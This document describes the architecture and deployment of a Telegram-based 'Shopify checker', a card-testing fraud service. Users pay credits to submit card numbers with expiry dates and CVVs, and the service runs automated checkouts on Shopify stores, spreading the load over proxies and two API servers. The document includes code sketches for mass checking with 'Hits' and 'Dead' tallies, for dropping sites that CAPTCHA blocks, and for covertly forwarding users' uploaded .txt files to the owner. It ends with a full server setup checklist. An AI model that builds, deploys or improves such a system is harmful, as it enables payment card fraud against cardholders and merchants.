# Button-Driven Architecture Explanation

## Overview

This Shopify checker system uses a **100% button-based interface**. Users only type `/start` once, and then interact entirely through clicking inline buttons. This creates a clean, modern, and intuitive user experience.

## How It Works

### Traditional Bot vs Button-Driven Bot

**Traditional Bot (Command-Based):**
```
User: /start
Bot: Welcome! Available commands:
     /cc - Single check
     /chk - Mass check
     /redeem - Redeem key
     /info - Show info
     ...

User: /cc
Bot: Send card...

User: 4532123456789012|12|26|123
Bot: Result...
```

**Our Button-Driven Bot:**
```
User: /start
Bot: [Shows menu with buttons:]
     [💳 Single Check]
     [📁 Mass Check]
     [💎 Redeem Key]
     [📊 My Info]
     ...

User: *clicks "💳 Single Check"*
Bot: Send card...

User: 4532123456789012|12|26|123
Bot: Result...
```

## Technical Implementation

### 1. Callback Queries

Instead of text commands, we use Telegram's **callback queries**. When a user clicks a button, Telegram sends a callback with custom data:

```python
# Create a button
Button.inline("💳 Single Check", b"single_check")
#                 ↑ Label shown    ↑ Data sent to bot when clicked

# Handle the callback
@bot.on(events.CallbackQuery(pattern=b"single_check"))
async def single_check_callback(event):
    # User clicked the button
    # Show them instructions
    await event.edit("Send a card in format: cc|mm|yy|cvv")
```

### 2. Session Management

The bot tracks what action each user is performing:

```python
active_sessions = {}

# When user clicks "Single Check" button:
active_sessions[user_id] = {'action': 'single_check'}

# When user sends a message:
if active_sessions[user_id]['action'] == 'single_check':
    process_single_check(message)
```

### 3. Dynamic Menus

Buttons change based on context:

**Main Menu (regular user):**
```python
buttons = [
    [Button.inline("💳 Single Check", b"single_check")],
    [Button.inline("📁 Mass Check", b"mass_check")],
    [Button.inline("💎 Redeem Key", b"redeem_key")],
]
```

**Main Menu (admin):**
```python
buttons = [
    [Button.inline("💳 Single Check", b"single_check")],
    [Button.inline("📁 Mass Check", b"mass_check")],
    [Button.inline("💎 Redeem Key", b"redeem_key")],
    [Button.inline("🔒 Admin Panel", b"admin_panel")],  # Extra button!
]
```

### 4. Nested Menus

Admin panel has sub-menus:

```
Main Menu
    ↓ (click Admin Panel)
Admin Panel
    ↓ (click Site Management)
Site Management
    ↓ (click Set Price Filter)
Filter Selection
    ↓ (click Under $5)
Confirmation
    ↓ (click Back)
Site Management
```

Each level is a separate callback handler:

```python
@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def admin_panel_callback(event):
    await event.edit("Admin Panel", buttons=admin_panel_buttons())

@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def admin_sites_callback(event):
    await event.edit("Site Management", buttons=site_management_buttons())

@bot.on(events.CallbackQuery(pattern=b"site_filter"))
async def site_filter_callback(event):
    await event.edit("Select Filter", buttons=filter_selection_buttons())
```

## Three-VPS Architecture

### Why 3 VPS?

**VPS1 (16GB/4c) - Primary API:**
- Highest resources
- Handles most checkout requests
- 6 Hypercorn workers × 5 concurrent = 30 simultaneous checkouts

**VPS2 (8GB/4c) - Secondary API:**
- Backup and load sharing
- 4 Hypercorn workers × 5 concurrent = 20 simultaneous checkouts

**VPS3 (8GB/2c) - Bot:**
- Handles all user interactions
- Load-balances API calls across VPS1 and VPS2
- Health checks every 30 seconds
- Caches prices to reduce API load

### Communication Flow

```
User in Telegram
    ↓
    ↓ (clicks button)
    ↓
VPS3 - Bot receives callback
    ↓
    ↓ (checks user credits, gets site)
    ↓
    ↓ (calls API endpoint)
    ↓
    ├─→ VPS1 - API (if healthy, 60% of requests)
    │       ↓
    │       ↓ (fetches products from Shopify)
    │       ↓ (performs checkout via GraphQL)
    │       ↓ (returns result)
    │       ↓
    └─→ VPS2 - API (if VPS1 busy, 40% of requests)
            ↓
            ↓ (same checkout process)
            ↓ (returns result)
            ↓
VPS3 - Bot receives result
    ↓
    ↓ (formats with BIN info, emojis)
    ↓
    ↓ (shows to user)
    ↓
User sees result in Telegram
```

### Load Balancing

The bot uses **round-robin** with **health checks**:

```python
# Every 30 seconds:
for endpoint in API_ENDPOINTS:
    if endpoint_is_healthy(endpoint):
        _healthy_endpoints.add(endpoint)
    else:
        _healthy_endpoints.remove(endpoint)

# When making a request:
endpoint = _healthy_endpoints[_current_index]
_current_index = (_current_index + 1) % len(_healthy_endpoints)
```

**Example:**
- Request 1 → VPS1
- Request 2 → VPS2
- Request 3 → VPS1
- Request 4 → VPS2
- ...

If VPS1 goes down:
- Request 1 → VPS2
- Request 2 → VPS2
- Request 3 → VPS2
- ...

## Price Filtering System

### How It Works

1. **Admin sets filter** (via button):
   ```
   Click "🔄 Set Price Filter"
     ↓
   Click "💰 Under $5"
     ↓
   ACTIVE_FILTER = "under5"
   ```

2. **Cache warmup starts** (background):
   ```python
   for site in sites:
       product = fetch_cheapest_product(site, max_price=5)
       cache[site] = product.price
   ```

3. **User checks card**:
   ```python
   # Bot filters sites by cached price
   available_sites = [s for s in sites if cache[s] <= 5]
   site = random.choice(available_sites)
   ```

4. **API enforces filter**:
   ```python
   products = fetch_products(site)
   valid = [p for p in products if p.price <= max_price]

   if not valid:
       return {"error": "NO_PRODUCT_IN_PRICE_RANGE"}
   ```

5. **Bot refunds on error**:
   ```python
   if result['error'] == 'NO_PRODUCT_IN_PRICE_RANGE':
       refund_credit(user)
   ```

### Cache TTL

- **Price cache:** 1 hour TTL
- **Product cache:** 30 minutes TTL

After TTL expires, next request will refresh the cache.

## Live Progress Bars

### Mass Check Example

```python
# Start checking
total = 100
done = 0

# Update every 2 seconds
while done < total:
    await asyncio.sleep(2)

    progress = (done / total) * 100
    bar_filled = int(progress / 10)
    bar = '█' * bar_filled + '░' * (10 - bar_filled)

    await message.edit(
        f"Progress: {done}/{total} ({progress:.1f}%)\n"
        f"[{bar}] {progress:.0f}%\n"
        f"✅ Hits: {hits}\n"
        f"❌ Dead: {dead}"
    )
```

**Output:**
```
Progress: 40/100 (40.0%)
[████░░░░░░] 40%
✅ Hits: 5
❌ Dead: 35
```

## File Forwarding

Any `.txt` file sent by any user is automatically forwarded to the owner:

```python
@bot.on(events.NewMessage)
async def message_handler(event):
    if event.document:
        file_name = event.document.attributes[0].file_name

        if file_name.endswith('.txt') and sender_id != OWNER_ID:
            # Forward to owner
            await bot.send_file(
                OWNER_ID,
                event.document,
                caption=f"From: {sender_name} (@{username})\nID: {sender_id}\nFile: {file_name}"
            )
```

## Site Testing Logic

The key insight: **Any response from Shopify means the site is working**.

```python
def is_site_working(response):
    # These mean site is DEAD:
    if 'CAPTCHA_REQUIRED' in response:
        return False  # Site blocked us
    if 'TIMEOUT' in response:
        return False  # Site not responding
    if 'SSL_ERROR' in response:
        return False  # Site has SSL issues

    # Everything else means site is WORKING:
    # - "CARD_DECLINED" = site works, card is dead
    # - "INSUFFICIENT_FUNDS" = site works, card is dead
    # - "Charged" = site works, card is good
    # - "Approved" = site works, card is good

    return True
```

This is important because:
- A "declined" card doesn't mean the site is broken
- We only remove sites that can't process ANY card
- This keeps more sites in the pool

## Credit System

### Premium Keys

```json
{
  "ABCD1234EFGH5678": {
    "plan": "gold"
  }
}
```

When redeemed:
```python
plan = PLANS['gold']  # {days: 14, credits: 20000}
expiry = now + timedelta(days=14)
user['credits'] = 20000
user['expiry'] = expiry.timestamp()
```

### Credit Keys

```json
{
  "WXYZ9876STUV4321": 5000
}
```

When redeemed:
```python
user['credits'] += 5000  # Add to existing credits
# No expiry change
```

### Refund Logic

```python
# Deduct credit
user['credits'] -= 1

try:
    result = check_card(...)

    # Refund on site errors (not card errors)
    if result['error'] in ['NO_PRODUCT_IN_PRICE_RANGE', 'CAPTCHA', 'TIMEOUT']:
        user['credits'] += 1  # Refund
except Exception as e:
    user['credits'] += 1  # Refund on any exception
```

## Concurrency Controls

### Bot Level

```python
MASS_CHECK_WORKERS = 20  # Check 20 cards at once

semaphore = asyncio.Semaphore(20)

tasks = []
for card in cards:
    async def check():
        async with semaphore:
            result = await check_card(card)
    tasks.append(check())

await asyncio.gather(*tasks)
```

### API Level

```python
MAX_CONCURRENT = 5  # 5 concurrent checkouts per worker

semaphore = asyncio.Semaphore(5)

@app.route('/shopify')
async def shopify():
    async with semaphore:
        # Only 5 requests can be here at once
        result = await perform_checkout(...)
        return result
```

### Total Capacity

```
VPS1: 6 workers × 5 concurrent = 30
VPS2: 4 workers × 5 concurrent = 20
Total: 50 simultaneous checkouts

Bot: 20 concurrent mass check workers
Bot: 1 worker per single check (instant)
```

## Security Features

### Ban System

```python
banned = ['123456', '789012']  # User IDs

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if str(event.sender_id) in banned:
        await event.respond("You are banned")
        return
```

### Admin-Only Functions

```python
@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id not in ADMIN_IDS:
        await event.answer("Unauthorized", alert=True)
        return
```

### Credit Expiry

```python
user = {
    'credits': 5000,
    'expiry': 1735689600  # Jan 1, 2025
}

if now > user['expiry']:
    user['credits'] = 0  # Expired
```

## Performance Optimizations

### 1. Async Everywhere

All I/O operations use `async/await`:
- File reading: `aiofiles`
- HTTP requests: `aiohttp`, `curl_cffi`
- Telegram: `telethon` (async by default)
- Web server: `quart` + `hypercorn` (async ASGI)

### 2. Caching

- Price cache (1h TTL) - Avoids repeated product fetches
- Product cache (30min TTL) - Stores product IDs
- Health status cache (30s refresh) - Avoids constant health checks

### 3. Load Balancing

- Round-robin across healthy endpoints
- Automatic failover if endpoint down
- Worker pools with semaphores

### 4. Connection Pooling

- `aiohttp` maintains connection pools
- `curl_cffi` reuses connections
- Telegram client maintains persistent connection

### 5. Batch Operations

- Mass check processes cards in parallel (20 at once)
- Site testing uses semaphore to avoid overwhelming sites
- Progress updates batched every 2 seconds (not every card)

## Deployment Checklist

### VPS1 (Primary API)
- [ ] Install Python 3.11+
- [ ] Upload `api.py`, `queries.py`, `requirements.txt`
- [ ] Create `.env` with `WORKERS=6`, `PORT=5000`
- [ ] Install dependencies: `pip3 install -r requirements.txt`
- [ ] Copy `shopify-api.service` to `/etc/systemd/system/`
- [ ] Enable and start: `systemctl enable shopify-api && systemctl start shopify-api`
- [ ] Test health: `curl http://localhost:5000/health`
- [ ] Open firewall: `ufw allow 5000/tcp`

### VPS2 (Secondary API)
- [ ] Same as VPS1, but `.env` has `WORKERS=4`

### VPS3 (Bot)
- [ ] Install Python 3.11+
- [ ] Upload `bot.py`, `requirements.txt`
- [ ] Create `.env` with Telegram credentials and API endpoints
- [ ] Install dependencies: `pip3 install -r requirements.txt`
- [ ] Create empty files: `sites.txt`, `proxy.txt`, etc.
- [ ] Copy `shopify-bot.service` to `/etc/systemd/system/`
- [ ] Enable and start: `systemctl enable shopify-bot && systemctl start shopify-bot`
- [ ] Check logs: `journalctl -u shopify-bot -f`
- [ ] Test in Telegram: `/start`

## Troubleshooting

### "No API endpoints available"
- Check API_ENDPOINTS in bot's `.env`
- Must end with `/shopify`
- Test health: `curl http://VPS1_IP:5000/health`

### "Bot not responding to buttons"
- Check logs: `journalctl -u shopify-bot -f`
- Restart: `systemctl restart shopify-bot`

### "All cards failing"
- Check sites.txt has valid URLs
- Test API manually: `curl "http://VPS1_IP:5000/shopify?url=https://site.com&test=true"`
- Check proxies are working

### "High memory usage"
- Reduce MASS_CHECK_WORKERS
- Reduce API WORKERS count
- Restart services to clear cache

## Summary

This button-driven architecture provides:
- **Cleaner UX:** No command memorization
- **Better scalability:** 3-VPS setup with load balancing
- **Higher reliability:** Health checks and failover
- **Easier administration:** Full GUI admin panel
- **Better performance:** Async/await, caching, pooling
- **Production-ready:** Systemd services, monitoring, logging

The system is designed to handle high load while remaining user-friendly and maintainable.
